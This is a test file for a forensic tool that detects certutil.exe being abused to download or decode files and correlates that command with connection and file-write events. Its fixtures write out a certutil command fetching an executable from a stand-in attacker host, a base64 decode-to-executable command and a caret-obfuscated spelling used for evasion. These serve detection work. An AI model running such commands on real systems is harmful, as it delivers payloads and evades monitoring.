import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  isCertutilTransfer,
  isCertificateAdmin,
  transferLegs,
  explainTransfer,
  explainCertutilTransfers,
} from "../../src/analysis/certutilTransfer.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

let seq = 0;
const ev = (over: Partial<ForensicEvent> = {}): ForensicEvent => ({
  id: `e${++seq}`,
  timestamp: "2026-01-01T10:00:00Z",
  description: "",
  severity: "Medium",
  mitreTechniques: [],
  relatedFindingIds: [],
  sourceScreenshots: [],
  asset: "WS-01",
  processName: "certutil.exe",
  pid: 4321,
  ...over,
});

const cmd = (over: Partial<ForensicEvent> = {}) =>
  ev({
    description: "Process created: certutil.exe",
    commandLine: "certutil -urlcache -split -f http://evil.test/a.exe C:\\Temp\\a.exe",
    ...over,
  });

describe("what counts as a transfer", () => {
  it("recognises the download and decode verbs", () => {
    expect(isCertutilTransfer("certutil.exe", "-urlcache -split -f http://x/a")).toBe(true);
    expect(isCertutilTransfer("certutil.exe", "-decode payload.b64 payload.exe")).toBe(true);
    expect(isCertutilTransfer("certutil.exe", "-verifyctl -f http://x/a.ctl")).toBe(true);
  });

  // certutil's actual job. A certificate estate must not fill the timeline.
  it("does not treat certificate administration as a transfer", () => {
    for (const c of ["-store my", "-verify cert.cer", "-dump cert.cer", "-addstore root ca.cer"]) {
      expect(isCertutilTransfer("certutil.exe", c)).toBe(false);
      expect(isCertificateAdmin("certutil.exe", c)).toBe(true);
    }
  });

  it("treats a transfer verb combined with a store verb as a transfer", () => {
    expect(isCertutilTransfer("certutil.exe", "-urlcache -f http://x/a.crt -addstore root")).toBe(true);
    expect(isCertificateAdmin("certutil.exe", "-urlcache -f http://x/a.crt -addstore root")).toBe(false);
  });

  // The escaping normalizer feeds this too.
  it("recognises an escaped spelling", () => {
    expect(isCertutilTransfer("cmd.exe", "c^e^r^t^u^t^i^l -urlcache -f http://x/a")).toBe(true);
  });

  it("ignores a command that is not certutil", () => {
    expect(isCertutilTransfer("curl.exe", "-urlcache http://x/a")).toBe(false);
  });
});

describe("transferLegs — host, process identity and time", () => {
  it("links a connection and a file write from the same process", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({ timestamp: "2026-01-01T10:00:05Z", dstIp: "203.0.113.9", description: "network connection" }),
      ev({ timestamp: "2026-01-01T10:00:06Z", action: "write", path: "C:\\Temp\\a.exe" }),
    ]);
    expect(legs.commandTarget).toBe("http://evil.test/a.exe");
    expect(legs.connection).toBe("203.0.113.9");
    expect(legs.fileWritten).toBe("C:\\Temp\\a.exe");
    expect(legs.destination).toBe("C:\\Temp\\a.exe");
  });

  it("does not link another process's connection", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({
        timestamp: "2026-01-01T10:00:05Z",
        dstIp: "203.0.113.9",
        processName: "chrome.exe",
        pid: 999,
        description: "network connection",
      }),
    ]);
    expect(legs.connection).toBe("");
  });

  it("does not link another host's records", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({
        timestamp: "2026-01-01T10:00:05Z",
        asset: "WS-02",
        dstIp: "203.0.113.9",
        description: "network connection",
      }),
    ]);
    expect(legs.connection).toBe("");
  });

  it("does not link records far outside the window", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({ timestamp: "2026-01-01T12:00:00Z", dstIp: "203.0.113.9", description: "network connection" }),
    ]);
    expect(legs.connection).toBe("");
  });

  it("matches the same host under its short name and its FQDN", () => {
    const c = cmd({ asset: "WS-01.corp.local" });
    const legs = transferLegs(c, [
      c,
      ev({
        timestamp: "2026-01-01T10:00:05Z",
        asset: "WS-01",
        dstIp: "203.0.113.9",
        description: "network connection",
      }),
    ]);
    expect(legs.connection).toBe("203.0.113.9");
  });
});

// The distinction that decides what an analyst does next.
describe("explainTransfer — missing telemetry is stated, never assumed", () => {
  it("says a connection was not recorded when network telemetry WAS collected", () => {
    const note = explainTransfer({
      commandTarget: "http://x/a",
      destination: "",
      commandTimeUsable: true,
      connection: "",
      fileWritten: "",
      networkCollected: true,
      fileActivityCollected: true,
    });
    expect(note).toContain(
      "no outbound connection from this process was recorded, though network telemetry was collected",
    );
  });

  it("says the connection cannot be confirmed when no network telemetry was collected at all", () => {
    const note = explainTransfer({
      commandTarget: "http://x/a",
      destination: "",
      commandTimeUsable: true,
      connection: "",
      fileWritten: "",
      networkCollected: false,
      fileActivityCollected: false,
    });
    expect(note).toContain("no network telemetry was collected for this host");
    expect(note).toContain("cannot be confirmed either way");
  });

  it("never presents an absence as evidence the transfer did not happen", () => {
    const note = explainTransfer({
      commandTarget: "",
      destination: "",
      commandTimeUsable: true,
      connection: "",
      fileWritten: "",
      networkCollected: false,
      fileActivityCollected: false,
    });
    expect(note).not.toMatch(/did not (?:happen|download|transfer)|no transfer occurred/i);
  });
});

describe("explainCertutilTransfers — the timeline pass", () => {
  const corroborated = () => {
    const c = cmd({ severity: "Medium" });
    return [
      c,
      ev({ timestamp: "2026-01-01T10:00:05Z", dstIp: "203.0.113.9", description: "network connection" }),
      ev({ timestamp: "2026-01-01T10:00:06Z", action: "write", path: "C:\\Temp\\a.exe" }),
    ];
  };

  it("explains the transfer on the command event", () => {
    const [c] = explainCertutilTransfers(corroborated());
    expect(c.description).toContain("[certutil transfer:");
    expect(c.description).toContain("203.0.113.9");
    expect(c.description).toContain("C:\\Temp\\a.exe");
    expect(c.description).toContain("destination argument");
  });

  it("raises the command once a leg is corroborated", () => {
    expect(explainCertutilTransfers(corroborated())[0].severity).toBe("High");
  });

  // An explanation that says "nothing was collected" is worth attaching; it is not grounds to raise.
  it("explains but does not raise when nothing corroborates it", () => {
    const c = cmd({ severity: "Medium" });
    const [out] = explainCertutilTransfers([c]);
    expect(out.description).toContain("[certutil transfer:");
    expect(out.severity).toBe("Medium");
  });

  it("leaves certificate administration alone", () => {
    const admin = cmd({ commandLine: "certutil -store my" });
    expect(explainCertutilTransfers([admin])[0].description).not.toContain("[certutil transfer:");
  });

  it("is idempotent", () => {
    const once = explainCertutilTransfers(corroborated());
    expect(explainCertutilTransfers(once)[0].description).toBe(once[0].description);
  });

  it("returns the input untouched when the case has no certutil transfer", () => {
    const plain = [ev({ commandLine: "whoami" })];
    expect(explainCertutilTransfers(plain)).toBe(plain);
  });
});

describe("reachability", () => {
  it("runs from the merge", () => {
    const merge = readFileSync(join(process.cwd(), "src/analysis/stateMerge.ts"), "utf8");
    expect(merge).toContain("explainCertutilTransfers");
  });

  it("has its marker stripped before correlation keys a duplicate", () => {
    const corr = readFileSync(join(process.cwd(), "src/analysis/correlate.ts"), "utf8");
    expect(corr).toContain("certutil transfer");
  });
});

// Every one of these was a real defect the first version shipped.
describe("regressions", () => {
  // certutil.exe PID 100 and PID 200 are two processes. Falling through to the name let two
  // invocations minutes apart borrow each other's evidence.
  it("does not treat two PIDs of the same image as one process", () => {
    const c = cmd({ pid: 100 });
    const legs = transferLegs(c, [
      c,
      ev({ timestamp: "2026-01-01T10:00:05Z", pid: 200, dstIp: "203.0.113.9" }),
    ]);
    expect(legs.connection).toBe("");
  });

  // Sysmon's file-create rows and ECAR's file rows carry no process name or PID, so requiring
  // process identity made the write leg unreachable from real telemetry.
  it("links a write by the path the command asked for, with no process on the file row", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({
        timestamp: "2026-01-01T10:00:06Z",
        description: "File created",
        path: "C:\\Temp\\a.exe",
        processName: undefined,
        pid: undefined,
      }),
    ]);
    expect(legs.fileWritten).toBe("C:\\Temp\\a.exe");
  });

  it("does not link a write to some other path", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({
        timestamp: "2026-01-01T10:00:06Z",
        description: "File created",
        path: "C:\\Temp\\unrelated.log",
        processName: undefined,
        pid: undefined,
      }),
    ]);
    expect(legs.fileWritten).toBe("");
  });

  // A connection BEFORE the command did not result from it.
  it("does not link a connection that precedes the command", () => {
    const c = cmd();
    const legs = transferLegs(c, [c, ev({ timestamp: "2026-01-01T09:59:00Z", dstIp: "203.0.113.9" })]);
    expect(legs.connection).toBe("");
  });

  it("takes the closest connection after the command, not the first in array order", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({ timestamp: "2026-01-01T10:04:00Z", dstIp: "198.51.100.1" }),
      ev({ timestamp: "2026-01-01T10:00:02Z", dstIp: "203.0.113.9" }),
    ]);
    expect(legs.connection).toBe("203.0.113.9");
  });

  // "connection" and "network" in prose swept in share access, type-3 logons and SRUM byte rows —
  // and a SRUM row carries a process name, so it could become the leg while naming no destination.
  it("does not accept a SRUM byte-accounting row as the outbound connection", () => {
    const c = cmd();
    const legs = transferLegs(c, [
      c,
      ev({
        timestamp: "2026-01-01T10:00:05Z",
        description: "SRUM network: certutil.exe as CORP\\jdoe sent 4000 / recv 10 bytes",
      }),
    ]);
    expect(legs.connection).toBe("");
  });

  it("says correlation was impossible when the command's own time cannot be read", () => {
    const c = cmd({ timestamp: "not a date" });
    const note = explainTransfer(transferLegs(c, [c]));
    expect(note).toContain("could not be read");
    expect(note).toContain("says nothing about whether the transfer happened");
  });

  // A note written before the network evidence arrived must not be frozen as "not collected".
  it("re-explains a command once corroborating evidence arrives in a later import", () => {
    const first = explainCertutilTransfers([cmd({ severity: "Medium" })]);
    expect(first[0].description).toContain("no network telemetry");
    const second = explainCertutilTransfers([
      first[0],
      ev({ timestamp: "2026-01-01T10:00:05Z", dstIp: "203.0.113.9" }),
    ]);
    expect(second[0].description).toContain("203.0.113.9");
    // ...and it replaces the old explanation rather than appending a second one.
    expect(second[0].description.match(/\[certutil transfer:/g)).toHaveLength(1);
  });
});
